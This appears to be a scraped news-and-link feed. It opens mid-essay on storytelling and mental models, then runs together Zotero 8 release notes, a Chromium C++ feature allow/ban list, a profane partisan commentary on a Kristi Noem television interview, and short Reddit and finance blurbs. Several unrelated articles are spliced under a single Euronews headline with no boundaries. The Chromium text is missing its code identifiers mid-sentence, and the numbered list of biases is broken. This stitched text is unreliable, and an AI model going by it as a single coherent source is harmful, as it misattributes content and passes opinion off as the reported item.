plot, a story becomes a journey, a transformative experience for characters and readers. At its most basic level, a plot is a series of events connected by cause and effect. Event A leads to Event B, which leads to Event C, and so on, until the story reaches its resolution. But a good plot is more than just a linear chain of events. It’s a complex web of actions and reactions, of conflicts and resolutions, of setups and payoffs. Conflict is the heart of any plot. Without conflict, characters have no story or reason to act or change. Conflict can take many ­ forms—​­ person versus person, person versus nature, person versus society, person versus self. But all conflicts share a fundamental structure: a character wants something but faces obstacles. The plot is the events that arise from the character’s attempts to overcome these obstacles and achieve their goal. But plot is not just about external conflicts and goals. It’s also about the internal journey of the characters, the way they grow and change because of the events they experience. A good plot presents a character with external challenges and forces them to confront their own flaws, beliefs, and desires. In this sense, the plot is a crucible for the character. It’s the fire that tests and transforms the protagonist, revealing their true nature and potential. A character who ends a story unchanged, unaffected by the plot’s events, is a character in a story that hasn’t really gone anywhere. The best plots leave characters fundamentally altered, through triumph or tragedy. Plot is also personal. The most powerful story in the world is the one you tell yourself about the obstacles and challenges in front of you. A positive story doesn’t always ensure success, but a negative one almost guarantees failure. Once a story takes root, no matter how false, it can be hard to change. This applies to both humanity in general and to each of us individually. Change the story to change the results.At their core, characters are bundles of traits and motivations, of habits and histories, of strengths and flaws. They are the total of their choices and actions, the product of genetics, choices, and circumstances. But a great character is more than just a list of attributes. A great character is a paradox, a contradiction, a mystery that unfolds over the course of a story. In many ways, character is destiny. The choices a character makes, the actions they take, flow inevitably from who they are. A cautious, thoughtful character will approach a problem differently than an impulsive, emotional one. A character with a strong moral compass will make different decisions than one with a flexible relationship to the truth. Obstacles reveal character. But character is not static; it is not a fixed point but a journey. The best characters are the ones who grow and change throughout a story and who are transformed by the events of the plot and the interactions with other characters. Think of Ebenezer Scrooge, the miserly old man who learns the true meaning of generosity. Understanding a person’s character allows you to see someone for who they are at their core and step into their shoes. This helps you understand why they make their choices, predict their behavior, and empathize with their story. But remember, character is not set in stone. What happened yesterday is over. Today’s obstacles and challenges are nothing more than an opportunity to take a step toward or away from the person you want to be. No single choice satisfies the pursuit, only repeated steps in the right direction.The setting is the stage upon which the drama of the story unfolds, the physical and temporal context that shapes and reflects the actions of characters. An active participant in the narrative, setting is a force that can enable or hinder, reveal or conceal, enlighten or deceive. The setting is not just where the story happens but why it happens. Setting anchors a story in time and place, providing sensory details that make it real. But setting is more than just physical description. It’s also the social, cultural, and historical context that defines the parameters of what is possible and what is permissible for the characters. A story set in medieval Europe will have different constraints and opportunities than one set in ­ modern-​­ day Tokyo. A character in a small, gossipy village will face different challenges than one in a large, anonymous city. Setting shapes the choices characters make, the conflicts they face, the resolutions they find. But setting is not just a ­one-​­way street, not just the environment acting upon the characters. Characters also act upon and interact with their setting. They navigate its challenges, exploit its opportunities, and leave their mark on its landscape. Every story is a symbiotic relationship between character and setting, a reciprocal exchange of influence and transformation. Setting is the silent force that influences our fate. What we think and do is greatly impacted by our environment. This leads to a powerful and profound point: to change your behavior, change your environment. If you don’t, it will change you.Performance is the art of the ephemeral, the fleeting moment of creative expression existing only in the here and now. It’s where the boundaries between art and life blur, the artist’s body and actions become the medium, and the audience’s presence and participation become integral. At its core, performance is about presence, about the immediacy and intimacy of live action. In a world increasingly mediated by screens, live performance asserts the primacy of embodied experience, of the direct encounter between performer and spectator. It’s a reminder that art is not just a thing to be consumed but an event to be lived. But performance is also about absence, the gaps and spaces between action and interpretation, intention and reception. Unlike a painting or a sculpture, a performance can never be fully captured or contained. It exists only in the memories and testimonies of those who were there, in the ripples and reverberations it sends through the culture. Performance embraces the contingency and ­open- endedness of the live event, the sense that anything could happen, that meaning is always in the making. This contingency is both the power and the challenge of performance. It allows for spontaneity and responsiveness, adapting to and incorporating the unpredictable elements of the moment. Yet, it makes performance resistant to the control and perfection other art forms aspire to. A performance is always a collaboration with chance, a dance with the unknown. As audience members, we are not just passive observers but active participants in the performance. Our presence, reactions, and energy all become part of the work. Think of fans transmitting energy to a team to rally them from behind with a few minutes left in the game. Performance invites us to be cocreators, to complete the work through our own interpretations and responses. In so doing, we become part of something larger than ourselves. When we are fully present in any performance where someone is making themselves vulnerable, we may just glimpse the raw, unedited, unpolished essence of what it means to be human.The Mental Models of Military and WarOne of the most valuable military tactics is the habit of “personally seeing the front” before making decisions – not always relying on advisors, maps, and reports, all of which can be faulty or biased. The Map/Territory model, as does the incentive model, illustrates the problem of not seeing the front. Leaders of any organization can generally benefit from seeing the front, as it provides firsthand information and tends to improve the quality of secondhand information.The asymmetry model leads to an application in warfare whereby one side seemingly “plays by different rules” than the other side due to circumstance. Generally, this model is applied by an insurgency with limited resources. Unable to out-muscle their opponents, asymmetric fighters use other tactics, as with terrorism creating fear that’s disproportionate to their actual destructive ability.The Second World War was a good example of a two-front war. Once Russia and Germany became enemies, Germany was forced to split its troops and send them to separate fronts, weakening their impact on either front. Opening a two-front war can often be a useful tactic, as can solving a two-front war or avoiding one, as in the example of an organization tamping down internal discord to focus on its competitors.Though asymmetric insurgent warfare can be extremely effective, competitors have developed counterinsurgency strategies over time. Recently and famously, General David Petraeus of the United States led the development of counterinsurgency plans involving no additional force but substantial gains. Tit-for-tat warfare or competition often leads to a feedback loop that demands insurgency and counterinsurgency.The Mental Models of Human Nature and JudgmentFundamentally, the modern world operates on trust. Familial trust is generally a given (otherwise we’d have a hell of a time surviving), but we also choose to trust chefs, clerks, drivers, factory workers, executives, and many others. A trusting system is one that tends to work most efficiently; the rewards of trust are extremely high.Highly responsive to incentives, humans have perhaps the most varied and hardest to understand set of incentives in the animal kingdom. This causes us to distort our thinking when it is in our own interest to do so. A wonderful example is a salesman truly believing that his product will improve the lives of its users. It’s not merely convenient that he sells the product; the fact of his selling the product causes a very real bias in his own thinking.Ivan Pavlov very effectively demonstrated that animals can respond not just to direct incentives but also to associated objects; remember the famous dogs salivating at the ring of a bell. Human beings are much the same and can feel positive and negative emotion towards intangible objects, with the emotion coming from past associations rather than direct effects.Humans have a tendency to feel envious of those receiving more than they are, and a desire “get what is theirs” in due course. The tendency towards envy is strong enough to drive otherwise irrational behavior, but is as old as humanity itself. Any system ignorant of envy effects will tend to self-immolate over time.Based on past association, stereotyping, ideology, genetic influence, or direct experience, humans have a tendency to distort their thinking in favor of people or things that they like and against people or things they dislike. This tendency leads to overrating the things we like and underrating or broadly categorizing things we dislike, often missing crucial nuances in the process.Anyone who has been alive long enough realizes that, as the saying goes, “denial is not just a river in Africa.” This is powerfully demonstrated in situations like war or drug abuse, where denial has powerful destructive effects but allows for behavioral inertia. Denying reality can be a coping mechanism, a survival mechanism, or a purposeful tactic.One of the most useful findings of modern psychology is what Daniel Kahneman calls the Availability Bias or Heuristic: We tend to most easily recall what is salient, important, frequent, and recent. The brain has its own energy-saving and inertial tendencies that we have little control over – the availability heuristic is likely one of them. Having a truly comprehensive memory would be debilitating. Some sub-examples of the availability heuristic include the Anchoring and Sunk Cost Tendencies.8. Representativeness HeuristicThe three major psychological findings that fall under Representativeness, also defined by Kahneman and his partner Tversky, are:b. Tendency to Stereotype The tendency to broadly generalize and categorize rather than look for specific nuance. Like availability, this is generally a necessary trait for energy-saving in the brain.c. Failure to See False ConjunctionsMost famously demonstrated by the Linda Test, the same two psychologists showed that students chose more vividly described individuals as more likely to fit into a predefined category than individuals with broader, more inclusive, but less vivid descriptions, even if the vivid example was a mere subset of the more inclusive set. These specific examples are seen as more representative of the category than those with the broader but vaguer descriptions, in violation of logic and probability.Human beings are one of many social species, along with bees, ants, and chimps, among many more. We have a DNA-level instinct to seek safety in numbers and will look for social guidance of our behavior. This instinct creates a cohesive sense of cooperation and culture which would not otherwise be possible but also leads us to do foolish things if our group is doing them as well.Human beings have been appropriately called “the storytelling animal” because of our instinct to construct and seek meaning in narrative. It’s likely that long before we developed the ability to write or to create objects, we were telling stories and thinking in stories. Nearly all social organizations, from religious institutions to corporations to nation-states, run on constructions of the narrative instinct.We like to call other species curious, but we are the most curious of all, an instinct which led us out of the savanna and led us to learn a great deal about the world around us, using that information to create the world in our collective minds. The curiosity instinct leads to unique human behavior and forms of organization like the scientific enterprise. Even before there were direct incentives to innovate, humans innovated out of curiosity.The psychologist Steven Pinker calls our DNA-level instinct to learn grammatically constructed language the Language Instinct. The idea that grammatical language is not a simple cultural artifact was first popularized by the linguist Noam Chomsky. As we saw with the narrative instinct, we use these instincts to create shared stories, as well as to gossip, solve problems, and fight, among other things. Grammatically ordered language theoretically carries infinite varying meaning.13. First-Conclusion BiasAs Charlie Munger famously pointed out, the mind works a bit like a sperm and egg: the first idea gets in and then the mind shuts. Like many other tendencies, this is probably an energy-saving device. Our tendency to settle on first conclusions leads us to accept many erroneous results and cease asking questions; it can be countered with some simple and useful mental routines.It’s important for human beings to generalize; we need not see every instance to understand the general rule, and this works to our advantage. With generalizing, however, comes a subset of errors when we forget about the Law of Large Numbers and act as if it does not exist. We take a small number of instances and create a general category, even if we have no statistically sound basis for the conclusion.15. Relative Satisfaction/Misery TendenciesThe envy tendency is probably the most obvious manifestation of the relative satisfaction tendency, but nearly all studies of human happiness show that it is related to the state of the person relative to either their past or their peers, not absolute. These relative tendencies cause us great misery or happiness in a very wide variety of objectively different situations and make us poor predictors of our own behavior and feelings.As psychologists have frequently and famously demonstrated, humans are subject to a bias towards keeping their prior commitments and staying consistent with our prior selves when possible. This trait is necessary for social cohesion: people who often change their conclusions and habits are often distrusted. Yet our bias towards staying consistent can become, as one wag put it, a “hobgoblin of foolish minds” – when it is combined with the first-conclusion bias, we end up landing on poor answers and standing pat in the face of great evidence.Once we know the outcome, it’s nearly impossible to turn back the clock mentally. Our narrative instinct leads us to reason that we knew it all along (whatever “it” is), when in fact we are often simply reasoning post-hoc with information not available to us before the event. The hindsight bias explains why it’s wise to keep a journal of important decisions for an unaltered record and to re-examine our beliefs when we convince ourselves that we knew it all along.Justice runs deep in our veins. In another illustration of our relative sense of well-being, we are careful arbiters of what is fair. Violations of fairness can be considered grounds for reciprocal action, or at least distrust. Yet fairness itself seems to be a moving target. What is seen as fair and just in one time and place may not be in another. Consider that slavery has been seen as perfectly natural and perfectly unnatural in alternating phases of human existence.We tend to over-ascribe the behavior of others to their innate traits rather than to situational factors, leading us to overestimate how consistent that behavior will be in the future. In such a situation, predicting behavior seems not very difficult. Of course, in practice this assumption is consistently demonstrated to be wrong, and we are consequently surprised when others do not act in accordance with the “innate” traits we’ve endowed them with.Stress (Including Breaking Points)Stress causes both mental and physiological responses and tends to amplify the other biases. Almost all human mental biases become worse in the face of stress as the body goes into a fight-or-flight response, relying purely on instinct without the emergency brake of Daniel Kahneman’s “System 2” type of reasoning. Stress causes hasty decisions, immediacy, and a fallback to habit, thus giving rise to the elite soldiers’ motto: “In the thick of battle, you will not rise to the level of your expectations, but fall to the level of your training.”A major problem with historiography – our interpretation of the past – is that history is famously written by the victors. We do not see what Nassim Taleb calls the “silent grave” – the lottery ticket holders who did not win. Thus, we over-attribute success to things done by the successful agent rather than to randomness or luck, and we often learn false lessons by exclusively studying victors without seeing all of the accompanying losers who acted in the same way but were not lucky enough to succeed.We might term this Boredom Syndrome: Most humans have the tendency to need to act, even when their actions are not needed. We also tend to offer solutions even when we do not have knowledge to solve the problem.What a man wishes, he also believes. Similarly, what we believe is what we choose to see. This is commonly referred to as the confirmation bias. It is a deeply ingrained mental habit, both energy-conserving and comfortable, to look for confirmations of long-held wisdom rather than violations. Yet the scientific process – including hypothesis generation, blind testing when needed, and objective statistical rigor – is designed to root out precisely the opposite, which is why it works so well when followed.The modern scientific enterprise operates under the principle of falsification: A method is termed scientific if it can be stated so that a certain defined result would cause it to be proved false. Pseudo-knowledge and pseudo-science operate and propagate by being unfalsifiable. As with astrology, we cannot prove them either correct or incorrect because the conditions under which they would be shown false are never stated.]]></content:encoded></item><item><title>Reflection: C++’s Decade-Defining Rocket Engine - Herb Sutter - CppCon 2025</title><link>https://www.youtube.com/watch?v=7z9NNrRDHQU</link><author>/u/BlueGoliath</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 21:07:08 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Outrage in UK after Trump claims NATO troops avoided Afghanistan front line</title><link>https://www.youtube.com/watch?v=GV_z36FqrHo</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/GV_z36FqrHo?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 21:03:44 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[Outrage in UK after Trump claims NATO troops avoided Afghanistan front line

And now, it’s headed to the Supreme Court in a case called Trump v. Barbara.

For well over 100 years, birthright citizenship has been enshrined in the Constitution,with the understanding that anyone born on US soil is granted citizenship. 

But in Trump v. Barbara, the administration claims that the law applies to those who are not just born in the United States but also “owe allegiance” to it.

The plaintiffs represent a group of people affected by Trump’s executive order, and their argument is simple: Leave birthright citizenship alone.

Zotero 8 builds on the new design and features of Zotero 7 and includes a huge number of improvements and refinements.Redesigned Citation DialogZotero 8 introduces a new unified citation dialog, replacing the previous citation dialog (the “red bar”), the “classic” citation dialog, and the Add Note dialog (the “yellow bar”).The new dialog has two modes: List mode and Library mode. List mode lets you quickly search for citations from across your Zotero libraries by title, creator, and year. Library mode includes a library browser, letting you find items in specific libraries or collections. You can switch between the two modes with a single click, preserving any added items or entered search terms. By default, it will open in the last mode you used, but you can choose a different default mode in the settings.In Zotero 7, we added the ability to quickly add citations for selected items and open documents. In the new dialog, these options are available in both List mode and Library mode, so you can make these quick selections even if you otherwise prefer to add items via the library browser.As before, once you’ve selected an item, you can click on its bubble to customize the citation with a page number, prefix, etc. It’s also now possible to add any locator — not just a page number — right from the search bar by typing the full or short name (e.g., “line 10” or “l. 10” after the citation and pressing Enter/Return.You can switch between adding citations and adding notes using buttons in the bottom left, corresponding to the Add/Edit Citation and Add Note buttons in your word processor.(For those coming from the classic dialog, note that there’s no text field to make manual edits to citations. It’s been possible to edit citations directly in the document for many years, which is why the red bar didn’t include such a text field either. More importantly, though, such manual edits should be avoided in almost all cases. Instead, customize the citation via the citation dialog, which will allow Zotero to continue to update the citation as necessary.)Annotations in the Items ListAnnotations you make on PDFs, EPUBs, and webpage snapshots now show up under their parent attachments in the items list.Showing annotations in the items list makes it easier to view annotations across a library or collection, and it also makes it possible to search for annotations directly. For example, you can search for all annotations in a collection with a given tag and then create a note from those annotations or copy them to an external text editor with Quick Copy.In Advanced Search, you can use “Item Type” “is” “Annotation” to match annotations or use the Annotation Text and Annotation Comment search conditions to search for specific parts of the annotation.You can assign tags to selected annotations by dragging them to the tag selector, just like other items.Selected annotations show up in the item pane, grouped by top-level item.Reader Appearance Panel with Theme SupportWe’ve added a new Appearance panel in the reader that provides quick access to view settings and introduces support for reader themes.The view settings are per-document settings. Themes are applied globally for all documents, including in the attachment preview in the item pane, and apply to PDFs, EPUBs, and webpage snapshots.We offer a number of built-in themes (“Dark”, “Snow”, “Sepia”), and you can create custom themes just by specifying a foreground and background color. (Some other theme engines require additional accent colors, but we’ve tried to make this as simple as possible for users by automatically adjusting other colors based on the foreground and background colors.) You can set a different theme that applies to light mode and dark mode.The themes replace the previous on-by-default “Use Dark Mode for Content” option, which inverted images in dark mode. We’re now simply darkening images a bit when using a dark theme. Images and ink annotations in the reader sidebar and note editor are now only darkened as well (and only when Zotero itself is in dark mode).When possible, we also try to apply themes to PDF pages containing full-page images, such as scanned papers, by replacing whitish/dark colors with theme colors. (Otherwise we simply darken the page slightly.)It’s now possible to open notes in tabs in addition to separate windows. Note tabs fill the whole window, with wide margins for better readability and a clean, distraction-free space for note-taking.By default, double-clicking a note in the items list will open it in a tab. You can choose to open the note in the other space from the context menu, and you can change the default behavior using the “Open notes in new windows instead of tabs” setting in the General pane of the settings.Notes in tabs have a separate font size setting in the View menu.Reading Mode for Webpage SnapshotsReading Mode reformats webpage snapshots for easier reading, with unnecessary page elements removed. You can adjust line height and other view options from the Appearance panel.We’ve reworked the tabs menu to make it faster to interact with via the keyboard.You can now press Ctrl/Cmd-; to bring up the menu at any time.Once the menu is open, it simultaneously accepts search input, up/down navigation, and row selection, without the need to move between different parts of the menu. You can simply start typing the name of an open tab and then press Enter/Return to switch to it once you’ve narrowed down the list.It’s also possible to quickly close multiple tabs by moving between the row close buttons with up/down and pressing space bar to close a tab.Zotero now automatically keeps attachment filenames in sync with parent item metadata as you make changes (e.g., changing the title). In previous versions, while Zotero would automatically rename files when you first added them to your library, if you later edited the item’s metadata, you would need to right-click on the attachment and select “Rename File from Parent Metadata”.You can configure which file types renaming applies to from the General tab of the Zotero settings.After upgrading to this version, existing eligible files that don’t match the current filename format won’t be automatically renamed, but you can choose to rename them en masse from the Zotero settings. Zotero will also prompt you to rename all files if you change the filename format.“Rename File from Parent Metadata” has been removed from the item context menu. If a filename doesn’t match the configured filename format (e.g., because automatic renaming is disabled or you changed the format but didn’t choose to rename all files), you can click the “Rename File to Match Parent Item” button next to the filename in the attachment’s item pane to rename it.New Attachment Title OptionsZotero 7 introduced more consistent handling of attachment titles, preserving simpler, less-redundant titles (e.g., “Full Text PDF” or “Preprint PDF”) in cases where the title was previously changed to match the filename. Zotero 8 further refines its renaming and titling logic when adding multiple and/or non-primary attachments, to bring the functionality better in line with the intended behavior.We’ve also added a “Normalize Attachment Titles” option under Tools → Manage Attachments to update old primary attachments with titles matching the filename to use simpler titles such as “PDF”.While we recommend the default behavior, allowing Zotero to rename primary files and keep them renamed while using simpler titles in the items list, if you really prefer to view filenames instead of titles, you can now enable “Show attachment filenames in the items list” option in the General pane of the settings.Zotero 8 adds a version for Linux running on ARM64 devices. This includes ARM-based Chromebooks, Apple Silicon Macs running Linux (Linux VMs, Asahi Linux), and Raspberry Pis.If you’ve been unable to run Zotero on your ARM-based device, or you’ve been running the x86_64 version under emulation, give it a try.User Interface ImprovementsWe’ve made a number of changes across the interface to address common requests:A new button in the library tab allows you to quickly close the item pane without dragging its edge or using the menus.You can reorder item pane sections by dragging their icons in the side navigation bar.You can drag items, collections, and searches into the trash.You can drag attachments, notes, and related items from the item pane (e.g., to copy files to the filesystem or use Quick Copy).Collections automatically expand when you drag over them, making it easier to drop collections or items into subcollections.You can delete attachments from the item pane.Tabs maintain their size as you close them for faster closing of multiple tabs.With Zotero 8, the Zotero Connector save popup can autocomplete tags in your Zotero library and allows you to add a note to items as you save them.Zotero 8 includes much more than we can list here. See the changelog for additional details.If you’re already running Zotero, you can upgrade from within Zotero by going to Help → “Check for Updates…”.

It summarizes the supported state of new and updated language and library features in recent C++ standards and the Abseil library. This guide applies to both Chromium and its subprojects, though subprojects can choose to be more restrictive if necessary for toolchain support.The C++ language has in recent years received an updated standard every three years (C++11, C++14, etc.). For various reasons, Chromium does not immediately allow new features on the publication of such a standard. Instead, once Chromium supports the toolchain to a certain extent (e.g., build support is ready), a standard is declared “”, with new language/library features banned pending discussion but not yet allowed.You can propose changing the status of a feature by sending an email to cxx@chromium.org. Include a short blurb on what the feature is and why you think it should or should not be allowed, along with links to any relevant previous discussion. If the list arrives at some consensus, send a codereview to change this file accordingly, linking to your discussion thread.If an item remains on the TBD list two years after initial support is added, style arbiters should explicitly move it to an appropriate allowlist or blocklist, allowing it if there are no obvious reasons to ban.The current status of existing standards and Abseil features is:Default allowed; see banned features belowDefault allowed; see banned features belowInitially supported November 13, 2023; see allowed/banned/TBD features belowInitially supported January 2026; see allowed/banned/TBD features belowDefault allowed; see banned/TBD features below. The following dates represent the start of the two-year TBD periods for certain parts of Abseil:absl::linked_hash_set & map: Initially added to third_party Dec 30, 2025Banned features and third-party codeThird-party libraries may generally use banned features internally, although features with poor compiler support or poor security properties may make the library unsuitable to use with Chromium.Chromium code that calls functions exported from a third-party library may use banned library types that are required by the interface, as long as:The disallowed type is used only at the interface, and converted to and from an equivalent allowed type as soon as practical on the Chromium side.The feature is not banned due to security issues or lack of compiler support. If it is, discuss with cxx@chromium.org to find a workaround.C++11 Banned Language FeaturesThe following C++11 language features are not allowed in the Chromium codebase.Inline Namespaces [banned] Allows better versioning of namespaces. An integer of at least 64 bits.User-Defined Literals [banned] Allows user-defined literal expressions.C++11 Banned Library FeaturesThe following C++11 library features are not allowed in the Chromium codebase.<cctype>, <ctype.h>, <cwctype>, <wctype.h> [banned] Provides utilities for ASCII characters.<cfenv>, <fenv.h> [banned] Provides floating point status flags and control modes for C-compatible code. A standard date and time library. Exception throwing and handling.Engines And Generators From <random> [banned] Methods of generating random numbers. Provides compile-time rational numbers.

A type-safe container for single values of any type. The contents of a single memory unit.  has the same size and aliasing rules as , but does not semantically represent a character or arithmetic value, and does not expose operators other than bitwise ops. A standard way to manipulate files, directories, and paths in a filesystem.std::{from,to}_chars [banned] Locale-independent, non-allocating, non-throwing functions to convert values from/to character strings, designed for use in high-throughput contexts.std::{pmr::memory_resource,polymorphic_allocator} [banned] Manages memory allocations using runtime polymorphism.std::timespec_get [banned] Gets the current calendar time in the given time base.std::uncaught_exceptions [banned] Determines whether there are live exception objects.Transparent std::owner_less [banned] Function object providing mixed-type owner-based ordering of shared and weak pointers, regardless of the type of the pointee. Returns a  that tracks ownership of  by all existing s that refer to .C++20 Allowed Language FeaturesThe following C++20 language features are allowed in the Chromium codebase.Abbreviated function templates [allowed] Function params of type  become syntactic sugar for declaring a template type for each such parameter. Specified that a function may only be used in a compile-time context.Constraints and concepts [allowed] Allows bundling sets of requirements together as named concepts, then enforcing them on template arguments.Default comparisons [allowed] Requests that the compiler generate the implementation of any comparison operator, including . Prefer non-member comparison operators. When defaulting , also explicitly default . Together these are sufficient to allow any comparison as long as callers do not need to take the address of any non-declared operator.Designated initializers [allowed] Allows explicit initialization of subsets of aggregate members at construction.__has_cpp_attribute [allowed] Checks whether the toolchain supports a particular standard attribute. Ensures that a variable can be compile-time initialized. This is like a milder form of  that does not force variables to be const or have constant destruction.Initializers for bit-field members [allowed] Allows specifying the default initial value of a bit-field member, as can already be done for other member types.Lambda captures with initializers that are pack expansions [allowed] Allows initializing a capture with a pack expansion.Language feature-test macros [allowed] Provides a standardized way to test the toolchain's implementation of a particular language feature.[[likely]], [[unlikely]] [allowed] Tells the optimizer that a particular codepath is more or less likely than an alternative.Range-for statements with initializer [allowed] Like C++17's selection statements with initializer. Particularly useful before C++23, since temporaries inside range-expressions are not lifetime-extended until the end of the loop before C++23.Three-way comparison (“spaceship”) operator [allowed] Compares two objects in a fashion similar to . Perhaps most useful when defined as an overload in a class, in which case it can replace definitions of other inequalities. See also “Default comparisons”.using enum declarations [allowed] Introduces enumerator element names into the current scope.C++20 Allowed Library FeaturesThe following C++20 library features are allowed in the Chromium codebase. Provides various byte- and bit-twiddling functions, e.g. counting leading zeros. Concepts and classes used to implement three-way comparison (“spaceship”, ) support.

Provides compile-time constants for many common mathematical values, e.g. pi and e.std::assume_aligned [allowed] Informs the compiler that a pointer points to an address aligned to at least some particular power of 2.std::erase[_if] for containers [allowed] Erases from a container by value comparison or predicate, avoiding the need to use the  paradigm.std::hardware_{con,de}structive_interference_size [allowed] The std::hardware_destructive_interference_size constant is useful to avoid false sharing (destructive interference) between variables that would otherwise occupy the same cacheline. In contrast, std::hardware_constructive_interference_size is helpful to promote true sharing (constructive interference), e.g. to support better locality for non-contended data.std::is_[un]bounded_array [allowed] Checks if a type is an array type with a known or unknown bound. Linearly interpolates (or extrapolates) between two values.std::make_obj_using_allocator etc. [allowed]std::make_unique_for_overwrite [allowed] Like calling std::unique_ptr<T>(new T) instead of the more typical std::unique_ptr<T>(new T(...)). Finds the midpoint between its two arguments, avoiding any possible overflow. For integral inputs, rounds towards the first argument.std::ranges::subrange [allowed] Creates a view from an iterator and a sentinel. Useful for treating non-contiguous storage (e.g. a ) as a range.std::remove_cvref[_t] [allowed] Provides a way to remove const, volatile, and reference qualifiers from a type. Returns the size of an object as a signed type.std::string::(starts,ends)_with [allowed] Tests whether a string starts or ends with a particular character or string.C++20 Banned Language FeaturesThe following C++20 language features are not allowed in the Chromium codebase. A single UTF-8 code unit. Similar to , but considered a distinct type. Modules provide an alternative to many uses of headers which allows for faster compilation, better tooling support, and reduction of problems like “include what you use”.[[no_unique_address]] [banned] Allows a data member to be overlapped with other members.C++20 Banned Library FeaturesThe following C++20 library features are not allowed in the Chromium codebase. An updated version of  with fewer gotchas, similar to .

Journalists are still demanding answers from this administration, even while the Baghdadest Betty of all — Bari Weiss — does everything she can to strip mine the long-running news agency for abusable parts. (That refers to you, Tony Dokoupil.)Last Sunday morning, Margaret Brennan interviewed DHS head Kristi Noem on “Face the Nation.” Brennan did everything she could to push back against Noem’s false claims and bullshit assertions, but in the end, Noem clearly knew she’d always have the upper hand, thanks to Trump’s legal threats and Bari Weiss’s willingness to bury reporting that doesn’t please Trump.As ICE continues to detain, arrest, or kill anyone that seems to be too dark or too loud in Minnesota, Brennan asked if there’s an actual end point for yet another federal “surge” targeting a “blue” state. Noem, of course, can’t provide a straight answer despite being given straight facts by the interviewer.MARGARET BRENNAN: According to Pew, Minnesota’s population of immigrants here illegally stands at 2.2%. So, how do you judge when you’ve gotten everyone off the streets, that you say is, you know, requiring your federal agents be there? How do you say we’ve had mission accomplished?SEC. NOEM: Well, we won’t stop until we are sure that all the dangerous people are picked up, brought to justice and then deported back to their home countries–MARGARET BRENNAN: –You don’t have a number or a date?– SEC. NOEM: –We wouldn’t be in this situation- We wouldn’t be in this situation if Joe Biden hadn’t allowed our open-border policies to be in place and allowed up to 20 million people unvetted into this country. We have no idea how many dangerous people are here. That’s not an answer. Most of what fell out of Noem’s mouth during this interview wasn’t a direct answer. Instead, it was a bunch of Trump-esque rambling, randomly punctuated by Noem insisting the person interviewing her was lying. Noem insisted that the “millions” (most of which obviously do not reside in Minnesota) being swept up by ICE were violent criminals. She claimed “70% of them have committed or have charges against them on violent crimes.” Brennan pushed back, citing stats released : MARGARET BRENNAN: Okay, well, our reporting is that 47% based on your agency’s own numbers, 47% have criminal convictions against them*. But let’s talk about the other numbers–SEC. NOEM: –Which means you’re wrong again. Absolutely. We’ll get you the correct numbers–SEC. NOEM: –so you can use them in the future.MARGARET BRENNAN: Well, that’s from your agency. Noem is fully cooked. She’s indistinguishable from Trump or anyone else in his close orbit. When your lies are exposed by facts, you call the person with the actual facts a liar. But this willful disregard for truth is nothing new: this administration divorced itself from reality during Trump’s first term. In its second term, it’s pretending truth is whatever it says it is. But it gets scarier, stupider, and weirder from there. Here’s Noem defending murdering citizens on the street before veering off into an extremely Trumpian interpretation of First Amendment rights: SEC. NOEM: We’ve seen over 100 different vehicle weaponized and attacking law enforcement officers. I would hope that Mayor Frey, when he’s on here, that he’ll announce that he’s going to start working with us to bring safety to the streets. If he would set up a peaceful protest zone so that these individuals can exercise their First Amendment rights and do so peacefully, we would love that, because then we could work together to make sure we’re getting criminals to justice and letting people still express their First Amendment rights.While the government does have extremely limited powers to enact time-and-place restrictions on First Amendment activity, it certainly does not have the power to force any locale to restrict protests to only the places the government will allow protesters to gather. That’s the exact opposite of the First Amendment, which is exactly the sort of thing you’d expect a Trump administration figure to pitch, even if it would never impose restrictions like these on anyone protesting in  of Trump and his policies. (See also: hundreds of pardoned people who engaged in literal insurrection in 2021.) After bitching Brennan out for repeating the name of the officer (Jonathan Ross) who killed Renee Good (apparently it’s “doxxing” to use a published name during a national news interview [massive eye roll]), Noem goes on to claim (without facts in evidence) that ICE officers are dealing with threats up to (and including) frozen water: SEC. NOEM: –Don’t say his name. I mean, for heaven’s sakes, we- we don’t- we shouldn’t have people continue to dox law enforcement when they have an 8,000%–MARGARET BRENNAN: –his name is public–SEC. NOEM: –increase in death threats against them–MARGARET BRENNAN: — he was struck and hospitalized–SEC. NOEM: –I know, but that doesn’t mean it should continue to be said. His life- he got attacked with a car that was trying to take his life, and then people have attacked him and his family, and they are in jeopardy. And we have law enforcement officers every day who are getting death threats and getting attacked at their hotels and they are–MARGARET BRENNAN: –Well, can you tell me about his status right now–SEC. NOEM: –getting ice thrown at them. I can’t imagine why people might be throwing ice at ICE, but I’m sure someone much smarter than me will make that connection. And I may be just a humble small town writer who writes like your average George Bailey, but I have to imagine this might have gone better for Noem if she had decided to end that answer one sentence earlier. This would all be laughably surreal if this administration didn’t have so much power and the will to abuse it. It’s still surreal, but you have to embrace the blackest of comedy to croak out a laugh. This administration only knows two moves: bluster and gaslighting. Whatever you saw, you didn’t see. Whatever violations the government committed never happened. Whatever can be disputed by facts is just the ravings of leftist liars and mainstream media losers. As for everyone caught in this crossfire, fuck ’em. This party only serves itself. If there’s any silver lining here at all, it’s that Noem is too busy being Trump’s Bigot Barbie to kill her children’s pets any time soon. ]]></content:encoded></item><item><title>Flabbergasted by VM performance (on my Intel Xe 13th gen integrated graphics, so different from i915 in some ways)</title><link>https://www.reddit.com/r/linux/comments/1ql1liu/flabbergasted_by_vm_performance_on_my_intel_xe/</link><author>/u/Natural-Bowl5439</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 20:13:32 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[After breaking the kernel trying to share the GPU with the help of a non-mature SR-IOV implementation, all this in order to have maximum GPU performance between host and guest, I decided after the defeat to go with the traditional GPU acceleration instead.I feared the old days of trying virtualbox and seeing that the "acceleration" was just good for windows aero, hence the reason i explored SR-IOV.

Known as solo 401(k)s, they allow the self-employed to contribute $72,000 a year into tax-advantaged retirement accounts. That's nearly three times the maximum for typical salaried workers in the US. 

